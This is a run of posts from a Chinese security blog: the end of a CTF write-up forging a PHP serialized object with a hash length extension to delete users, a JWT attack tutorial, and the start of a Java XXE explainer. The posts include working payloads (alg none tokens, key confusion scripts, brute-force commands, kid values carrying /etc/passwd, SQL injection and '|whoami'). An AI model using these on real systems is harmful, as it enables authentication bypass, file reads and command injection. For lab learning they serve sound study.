= $username; header('Location:/web/riji.php'); } else { echo(\"&lt;script&gt;alert('Password Worng?')&lt;/script&gt;\"); } } else { echo(\"&lt;script&gt;alert('Username Worng?')&lt;/script&gt;\"); } } 作者是登录页面的处理，如果用户名存在，且对应的密码也相等了，就能登录。但这里暴漏了cookie的拼接方法，就是纯明文拼接，接着base64加密。 下面我们就要利用api.php提供的接口函数，因为这个文件被当做公共库被包含，在api.php的最下面找到： $a = unserialize(base64_decode($api)); $a-&gt;do_method(); 其中$api没有被初始化，所以这里我们就可以利用这个参数来控制admin这个类 del_user 函数使用前会调用 check 函数检测是否是 admin 用户，但是 check 函数存在 hash 拓展攻击，那么我们可以伪造一个 hash 实现 bypass //api.php function check(){ $username = addslashes($this-&gt;name); //进入数据库的数据进行转义 @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if(!empty($result)){ //利用 salt 验证是否为该用户 if($this-&gt;check === md5($result['salt'] . $this-&gt;data . $username)){ //这里存在hash拓展攻击 echo '(=-=)!!'; if($result['role'] == 1){//检查是否为admin用户 return 1; } else{ return 0; } } else{ return 0; } } else{ return 0; } } 在 forget.php 中可以无条件获取任意用户加盐后的 hash，从而有了 hash 拓展攻击的原材料 //forget.php @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) { if($result['salt']) { $check = base64_encode(md5($result['salt'])); $name = $result['name']; header(\"Location:/web/repass.php?username=$name&amp;check=$check&amp;mibao=$mibao&amp;pass=$pass\"); } else { echo(\"&lt;script&gt;alert('Get salt Worng?')&lt;/script&gt;\"); } } 首先在forget.php页面，输入用户admin，其他随便输入，接着发送，bp抓取302跳转，会发现它显示出了salt的md5加密结果。如下所示 /repass.php?username=admin&amp;check=YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U=&amp;mibao=asd&amp;pass=asd //解密:ab4d22925d268dd6937e41edbe81e97e 利用hash拓展工具破解 得到新hash: 拿到payload和生成好的md5，然后根据check的流程构造一个调用那个删除用户的接口函数，下面是构造删除当前用户的的代码： 对了，这里面要确定要删除用户的userid是哪一个，在用户登陆的跳转的地方用burp停一下，返回的数据里面的cookie里面有当前用户的userid(base64加密之后的数据） 得到这些之后构造代码： &lt;?php class admin { var $name=\"admin\"; var $check=\"6122c04e8a1f3529d556199960ef2556\"; //要check的md5 var $data=\"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; //工具生成好的可控变量(payload) var $method=\"del_user\"; //要调用的函数 var $userid=\"2\"; //要删除的用户 } $a=new admin(); $api=base64_encode(serialize($a)); echo $api; Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9 接着发送如下payload即可 http://node4.anna.nssctf.cn:28418/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9 如下图所示删除成功，id也成为了未初始化变量，我们直接对id进行联合注入即可 参考文章 SWPU 2017 write-up 详解2016 SWPU CTF web4 [GFCTF 2021]A Letter 这道题怀疑环境有问题。。。毕竟两年之久","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"JWT攻击学习","path":"/2024/02/27/jwt-gong-ji-xue-xi/","content":"0x01 JWT基本知识 搜索引擎介绍，JWT是Json Web Token的缩写，主要用于验证用户身份信息及跨域的身份验证。 JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在各方之间安全地作为 JSON 对象传输信息。它通常用于身份验证和授权。JWT由三个部分组成：头部、载荷和签名。 作为 JSON 对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 而JWT一般是由三部分组成，并使用base64编码。以下为完整的JWT认证信息： JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlRpbWUifQ.2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 //标头 eyJ1c2VybmFtZSI6IlRpbWUifQ //payload 2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA //签名 Header(标头) 标头通常由两部分组成：令牌的类型和所使用的签名算法，例如HMACSHA256或RSA。 Header头部承载两部分信息，分别是声明类型：JWT 和 声明加密算法： header = '{ \"alg\":\"HS256\", \"typ\":\"JWT\" }' 使用base64URL编码，形成JWT的第一部分。 Payload(有效载荷) 主体信息(有效载荷)，其中包含声明，声明是有关实体(一般是用户)和其他数据的声明。索赔有以下三种类型：注册的，公共的和私人权利；简单来说就是：注册声明、公共声明和私有声明。 注：这里就有可能存在信息泄露，默认情况下jwt是未加密的，在进行解码时就可以查看到一些敏感信息 已注册的权利要求：这是一组非强制性的但建议使用的预定义权利要求，以提供一组有用的可互操作的权利要求。其中一些是：iss(主题)， exp(到期时间)， sub(主题)， aud(受众)等。 公开声明：使用JWT的人员可以随意定义这些声明。但为避免冲突，应在IANA JSON Web令牌注册表中定义它们，或将其定义为包含抗冲突名称空间的URI。 私人权利：是指使用它们同意，并且不是当事人之间的，建立共享信息的自定义声明注册，或者公众的权利要求。 官方规定的七个字段(不强制要求选择，也可以自定义字段)： – iss (issuer)：签发人 – exp (expiration time)：过期时间 – sub (subject)：主题 – aud (audience)：受众 – nbf (Not Before)：生效时间 – iat (Issued At)：签发时间 – jti (JWT ID)：编号 payload = '{ \"loggedInAs\":\"admin\", \"iat\":1422779638 }'//iat表示令牌生成的时间 //使用base64URL编码，形成JWT的第二部分。 这里感觉上述的解释有点抽象，我借用其他文章的解释来进一步理解 公共声明(Public Claims)：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等 私有声明(Private Claims)：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等 注册声明(Registered Claims)：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等 Signature(签名) 签名，要创建签名部分，必须获取编码的标头、编码的有效载荷、机密、标头中指定的算法，并对其进行签名。 如果要使用HMAC SHA256算法，则将通过以下方式创建签名： HMACSHA256( #第一部分 base64UrlEncode(header) + \".\" + #第二部分 base64UrlEncode(payload), #秘钥 secret) //即 Signature = HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\"secret\") //secret保存在后端，就是来解析确定验证的key 使用base64Url编码后组成第三部分，最后将第一部分、第二部分、第三部分使用“.”连接组成一段完整的JWT令牌。 签名生成流程 首先需要指定一个secret（是用于签名和验证的密钥），该secret仅仅保存在服务器中，保证不能让其他用户知道 这个部分需要 base64URL 加密后的 heade和base64URL 加密后的 payload使用.连接组成的字符串 通过header中声明的加密算法进行加密secret组合加密 得出一个签名哈希，就是Signature，且无法反向解密 Python生成Jwt Web Token： import time import jwt #头信息 head = { \"alg\":\"HS256\", \"typ\":\"jwt\" } #payload payloda = { \"iat\":time.time(), \"name\":\"admin\" } #调用jwt库，生成json web token #秘钥，加密算法 jwt_token = jwt.encode(payload,\"1121\",algorithm=\"HS256\",headers=head) #输出 print(jwt_token) 生成token如下： python解密JWT import jwt #需要解码的token jwt_token = \"eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.eyJpYXQiOjE3MDkwMjkxNzYuODY2ODkwMiwibmFtZSI6ImFkbWluIn0.Krq4e2UHaTCpWwCm00bZYPimiQxtl004Y98BOy9-Xo0\" data = None try: #秘钥 data = jwt.decode(jwt_token,\"1121\",algorithms=\"HS256\") except Exception as e: print(e) print(data) 0x02 JWT工作流程 用户使用账号、密码登录应用，登录的请求发送到 Authentication Server（身份验证服务器）。 Authentication Server 进行用户验证，然后创建 JWT 字符串返回给客户端。 客户端请求接口时，在请求头带上 JWT。 Application Server 验证 JWT 合法性，如果合法则继续调用应用接口返回结果。 知识补充 JWS：即JSON Web Signature，Signed JWT，签名过的JWT JWE：Encrypted JWT部分payload经过加密的JWT JWK：JWT的密钥，也就是我们常说的SECRET JKU：JKU(JSON Web Key Set URL)是JWT Header中的一个字段，字段内容是一个URI，该URI用于指定用于验证令牌秘钥的服务器，该服务器用于回复JWK 密钥基本了解 symmetric：对称密钥 RSA：公钥密码 ECC：是一种基于椭圆曲线数学原理的加密算法，其密钥由一对(公钥、私钥)组成 OKP（Octet Key Pair）密钥是一种用于加密和身份验证的公钥密码学密钥对。它基于椭圆曲线密码学（Elliptic Curve Cryptography，ECC）算法，与传统的RSA（Rivest-Shamir-） Adleman）加密算法不同。 0x03 攻击手法 敏感信息泄露 因header和payload部分是使用可逆的base64方法编码，所以只要获取到令牌，就可以将前两个部分解密后读取内容 解密方法： //Linux base64 echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d //输出：{\"typ\":\"JWT\",\"alg\":\"HS256\"} 浏览器JavaScript控制台： atob(\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\") //输出：\"{\"typ\":\"JWT\",\"alg\":\"HS256\"}\" Powershell： [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\")) //输出：{\"typ\":\"JWT\",\"alg\":\"HS256\"} Python： import base64 print(base64.b64decode('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9')) //输出：{\"typ\":\"JWT\",\"alg\":\"HS256\"} 当然也可以利用在线工具 修改签名算法(none) JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。 可以看下面的小练习，项目地址：https://github.com/Sjord/jwtdemo 对应的在线网址：http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php 可以将上面显示的JWT输入到文本框，点击发送。这里该网站应该是充当身份验证服务器，检验发送的JWT的合法性 发送之后，如上图发现JWT被成功解析，接下来我们可以将alg修改为none import time import jwt #头信息 head = { \"alg\":\"none\", \"typ\":\"JWT\" } #payload payload = { \"iat\":time.time(), \"name\":\"admin\" } #调用jwt库，生成json web token #秘钥，加密算法 jwt_token = jwt.encode(payload,\"\",algorithm=\"HS256\",headers=head) #输出eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE3MDkwMzA5MDkuNTIwODQ2LCJuYW1lIjoiYWRtaW4ifQ. print(jwt_token) 再次发送之后如下图： 修改RSA加密算法为HMAC 上述也可以说是：修改RS256算法为HS256 HMAC也就是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。 RSA也就是RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。 在HMAC和RSA算法中，都是使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。 现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥pem对JWT token进行签名，公钥pub对签名进行验证。 { \"alg\" : \"RS256\", \"typ\" : \"jwt\" } 通常情况下密钥pem是无法获取到的，但是公钥pub却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即 { \"alg\" : \"HS256\", \"typ\" : \"jwt\" } 同时使用获取到的公钥pub作为算法的密钥，对token进行签名，发送到服务器端。 服务器端会将RSA的公钥（pub）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。 在线练习地址：http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php 公钥获取地址：http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem 获取公钥如下： -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c 1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+ H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw 2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF KwIDAQAB -----END PUBLIC KEY----- 接着将算法改为HS256然后使用泄露的公钥进行签名，服务器会使用HS256和泄露的公钥进行验证。 import time import jwt key = [ \"-----BEGIN PUBLIC KEY-----\", \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF\", \"NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c\", \"1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+\", \"H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f\", \"ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw\", \"2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF\", \"KwIDAQAB\", \"-----END PUBLIC KEY-----\" ] key = \" \".join(key) payload = { \"name\":\"admin\" } #调用jwt库，生成json web token #秘钥,加密算法 jwt_token = jwt.encode(payload,algorithm=\"HS256\",key=key+\" \") #输出 print(jwt_token) 这里运行之后发现报错 发现报错发生在268，跟踪看看 发现这里会调用函数检查key是否合法（有效），看了其他文章发现直接注释即可，之后成功生成：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.pbbcYFOp6TyFXNa36PmpoArpNMc8jjSoJA0LsAuUcCQ 向网站发送JWT发现成功解析 爆破密钥 这里方法似乎还挺多，一个个来 能进行爆破密钥的前提： 知悉JWT使用的加密算法 一段有效的、已签名的token 签名用的密钥不复杂（弱密钥） 例如将密钥字符串用作PyJWT库示例代码中的密钥的时候，情况就是如此。所以其实JWT 密钥爆破的局限性很大。 爆破脚本地址：https://github.com/Devllench/jwtbrute——结果这个项目无了。。。既然无了，就看其他工具了 字典地址：https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 另一个强大工具：c-jwt-cracker 下面是一些实例 可以看到简单的字母数字组合都是可以爆破的，但是密钥位数稍微长一点或者更复杂一点的话，爆破时间就会需要很久。 修改KID参数 kid是jwt header中的一个可选参数，全称是key ID，它用于指定加密算法的密钥 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } 因为该参数可以由用户输入，所以也可能造成一些安全问题。 任意文件读取 kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQL注入 kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key11111111' || union select 'secretkey' -- \" } 命令注入 对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。 \"/path/to/key_file|whoami\" 对于其他的语言，例如php，如果代码中使用的是exec或者是system来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。 修改JKU/X5U参数 JKU的全称是\"JSON Web Key Set URL\"，用于指定一组用于验证令牌的密钥的URL。类似于kid，JKU也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。 X5U则以URI的形式数允许攻击者指定用于验证令牌的公钥证书或证书链，与JKU的攻击利用方式类似。 0x04 实操练习 WebGoat靶场 关卡一 这关看了介绍，发现是让我们利用JWT签名验证逻辑顺序错误的漏洞来攻击JWT。默认我们为guest，没有任何权限，我们可以在上图右侧修改我们的角色为其他人物，即可进行正常的投票，我们随便点击vote并用bp抓包，成功得到JWT token eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDAzNDMsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.WysxmVfuu77y_pWCrqh-9ahKpIlM4mjXDUBprpkGwHzQSrHS-9U4LcM_0PCV5N51zRSMirxpD5Sgm_1B9VMljA 这里我们直接将admin改为true eyJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk5MDAzNDMsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.judvtmb9kKhdMoMdymtqtPZBtlzOG4rpeFoHJsFNolg 试了几次无果，看了wp发现似乎是要点击重置投票功能的。。。。。 重新得到token eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDEwMjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.peNJmW0dIEc-S-d-S2FqX2kKkNFJOd6EBmMC23XHSR01ybs5UY7sYmoiB0u3VHW53F-VQeOpWuD2VZypfmvDTA //修改后如下 eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MDk5MDEwMjYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.1j8OQ6le4ECgFN3EPq2yQFhxM4pLwAMJcMfsVx599r09ZtkTOg5QF5xb7EFUdAofvgF2jCVCHrthIc2dxUNryg 接着我又尝试发包，发现仍然不行，看了wp说是注意时间戳（这里我没懂，难道是要符合发包时间吗？）接着又找了几篇文章，发现他们的方法都是将最后面的签名部删除，随后直接发包即可，如下图所示 因为我们不知道该JWT的密钥，因此直接修改admin不行，而这里删除了第三部分，且绕过了，说明后端没有校验签名部分，因此我们就可以任意修改alg的值即可通过 关卡二 顾名思义就是暴力破解密钥，直接上工具，没啥说的，成功率就在于字典是否强大了 eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTcwOTAzNzY5NSwiZXhwIjoxNzA5MDM3NzU1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.53NEK2Tg8Fg7y-OMeExFQOBC7Ryo5ns8AQ0y-FTdAyc python jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTcwOTAzNzY5NSwiZXhwIjoxNzA5MDM3NzU1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.53NEK2Tg8Fg7y-OMeExFQOBC7Ryo5ns8AQ0y-FTdAyc -C -d jwt-secrets.txt 命令如上，成功爆破：available 修改后发送发现抱错，看了看时间戳，发现该token过了有效期了，我们直接修改exp延长过期时间即可 这里我将过期时间改为了明天，如下图成功发送 关卡三 这里是让我们买东西，但最终凭借攻击JWT，来让其他用户替我们付费 这里再仔细看发现，这里有一个日志文件，记录了上一次该网站被攻击的行为，我们可以看看 可以看到它传入了token参数，并且其内容为JWT形式，我们可以具体看看 eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q 这里我想着仿照网络日志的攻击手法，直接get传参的，结果发现无论如何都显示JWT无效。看了文章发现这里采用的是HTTP身份验证形式 如图所示，当我们将JWT放入Authorization头中即可通过，且这里的密钥变了，但空签名也能进去，也懒得爆破了 之后又看了漏洞起源的文章：https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ 发现我们在日志中看见的请求条文的JWT已经是过期的，也就是访问令牌过期了，而该访问令牌如上图所示是Tom的，但JWT服务器显然没有验证刷新令牌的用户是否与访问令牌的用户匹配，当我们利用该过期的访问令牌去发送http请求给JWT服务器时，也就是上面bp的图片，我们即可获得一条全新的访问令牌 关卡四 这里是让我们凭借JWT水平越权删除别人的账户 这里我尝试抓取delete的包，如下图所示 解密之后，仔细观察可以发现，这里多了一个kid参数，回顾之前学的攻击方法，这里我猜测就是修改KID参数了，至于是那三个的哪种方法，我就没有头绪了，看了wp发现我估计我是想不到的 我们知道KID指定应使用json web密钥集中的那个密钥来验证JWT签名，之后结合wp来看有了如下观点： 签名用的 secret key 应该是根据 kid 在后台查询数据库得到的。 那么这个 kid 是否存在 SQL 注入漏洞，使得我们可以控制这个认证用的 secret key 呢？ 直接用 union select 查询来控制 secret key 为自定义的值，比如 password。 接着尝试发送，依旧是无效的JWT，无奈我们看一下源码如何处理 从上图可以看到，这里先是接受token参数，接着判断token是否为空来决定是否后续进行验证JWT合法性。 其中在验证其合法性中，其根据JWT中的kid的值来进入数据库进行查询相应的密钥key，且查询到的内容会进行base64的编码。 重点是这里对kid的值没有做出过滤，意味着我们可与进行sql注入 payload：\"kid\": \"hybcx' union select 'MQ==' from INFORMATION_SCHEMA.SCHEMATA--\", 如上图所示，接着发送bp即可，这里疑惑的点是，为何上述的key：1这个地方不能 select 1 ，随后在下面的签名处对secret进行base64加密（这种想法老是页面报错） 0x05 参考文章 JWT漏洞的基础学习 2018CUMTCTF-Final-Web 攻击JWT的一些方法 WebGoat 靶场通关笔记 ldentity &amp; Auth Failure Webgoat - JWT tokens 部分攻略 学习JWT，看这篇就够了！ JWT漏洞复现","tags":["基本知识"],"categories":["web知识总结"]},{"title":"浅析xxe漏洞-Java","path":"/2024/02/26/qian-xi-xxe-lou-dong-java/","content":"0x01 前言 最近发了学新任务，发现XXE的Java没有学习过，于是想着找几篇文章学习一下。Java水平也垃圾，只是单纯过了过基础语法，学起来对我还是有难度~~~ 由于水平垃圾，因此基本就是跟着文章的实验实操一遍，质量可能不高 0x02 XXE漏洞基础 这里简单过一下，因为看见有的师傅文章写的基础知识精辟，且仍有需要学习的地方，这里就大部分cv了 XML文档结构： XML主要由7个部分组成：文档声明、标签/元素、属性、注释、实体字符、CDATA 字符数据区、处理指令。 &lt;!--XML文档声明；另外也是一个处理指令，&lt;? xxx ?&gt;就是处理指令的格式--&gt; &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!--bookstore根元素、book子元素--&gt; &lt;bookstore&gt; &lt;!--category、lang都是属性--&gt; &lt;book category=\"COOKING\"&gt; &lt;title lang=\"en\"&gt;Everyday Italian&lt;/title&gt; &lt;!--&amp;lt;实体字符 是一个预定义的实体引用，这里也可以引用dtd中定义的实体，以 &amp; 开头, 以;结尾--&gt; &lt;author&gt;Giada De Laurentiis&amp;lt;&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;30.00&lt;/price&gt; &lt;!--script这里是CDATA，不能被xml解析器解析，可以被JavaScript解析--&gt; &lt;script&gt; &lt;![CDATA[ function matchwo(a,b) { if (a &lt; b &amp;&amp; a &lt; 0) then {return 1;} else {return 0;} } ]]&gt; &lt;/script&gt; &lt;/book&gt; &lt;/bookstore&gt; CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。CDATA 部分中的所有内容都会被解析器忽略。 CDATA 部分由 “**” 结束，某些文本比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。 XML示例： 如下实例，&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;是XML声明，&lt;!DOCTYPE description [&lt;!ENTITY abc \"123213123123123\" &gt;]&gt;就是DTD文档类型定义，&lt;description&gt;&amp;abc;&lt;/description&gt;是文档元素 其中abc就是引用的dtd中的abc。 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE description [ &lt;!ENTITY abc \"123213123123123\" &gt; ]&gt; &lt;description&gt;&amp;abc;&lt;/description&gt; DTD文档类型定义： DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以从外部引用。DTD实体也分为外部引用和内部定义。 DTD两种引入方式： 在XML内部声明DTD： &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT message (#PCDATA)&gt;]&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;message&gt;Reminder&lt;/message&gt; &lt;/note&gt; 在XML中引入外部DTD文档 &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;message&gt;Reminder&lt;/message&gt; &lt;/note&gt; &lt;!--而note.dtd的内容为:--&gt; &lt;!ELEMENT note (to,from,message)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT message (#PCDATA)&gt; DTD实体两种方式： 实体又分为一般实体和参数实体：一般实体的声明语法&amp;实体名；；参数实体只能在DTD中使用，参数实体的声明格式：%实体名；。 内部实体： 在dtd中定义了一个名为test的实体，实体的值为test-value： &lt;!ENTITY test \"test-value\"&gt; 外部实体： 在dtd中定义了一个名为test的实体，实体的值为URL： &lt;!ENTITY test SYSTEM \"URI/URL\"&gt; &lt;!ENTITY test SYSTEM \"file:///C://1.dtd\"&gt; &lt;!ENTITY test SYSTEM \"http://test.com/1.dtd\"&gt; 常见的xml解析方式有以下四种: 1)DOM生成和解析XML文档 2)SAX生成和解析XML文档 3)DOM4J生成和解析XML文档 4)JDOM生成和解析DOM文档 SAX是以流的形式读取XML文档中的内容，并在读取过程中自动调用预先定义的处理方法；DOM是将整个xml文档中的内容以tree的形式存储在内存当中，可以对这个tree中的任意一个节点进行操作，SAX则不能。SAX不适合用来修改xml内容，DOM需要耗费大量内存 0x03 实验 实操才发现，搭环境对我来说成了大问题。。。。因此这里先简单记录知识，Java下去得补补了 在Java中有很多jar包可以来解析XML： javax.xml.parsers.DocumentBuilder javax.xml.parsers.SAXParser javax.xml.parsers.SAXParserFactory javax.xml.transform.TransformerFactory javax.xml.validation.Validator javax.xml.validation.SchemaFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.transform.sax.SAXSource org.xml.sax.XMLReader org.xml.sax.helpers.XMLReaderFactory org.dom4j.io.SAXReader org.jdom.input.SAXBuilder org.jdom2.input.SAXBuilder javax.xml.bind.Unmarshaller javax.xml.xpath.XpathExpression javax.xml.stream.XMLStreamReader org.apache.commons.digester3.Digester SAXBuilder解析xml并修复漏洞 实验编写的servlet如下，其中postNoFixXxe是未修复时的方法，postWithFixXxe是修复后的方法，修复时通过 builder.setFeature设置外部实体不能被解析的方法从而防御xxe漏洞。 import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.PrintWriter; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.Document; import org.jdom2.output.XMLOutputter; public class SAXBuilderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { // postNoFixXxe(req, resp); postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { //获取请求输入流 BufferedReader reader = req.getReader(); 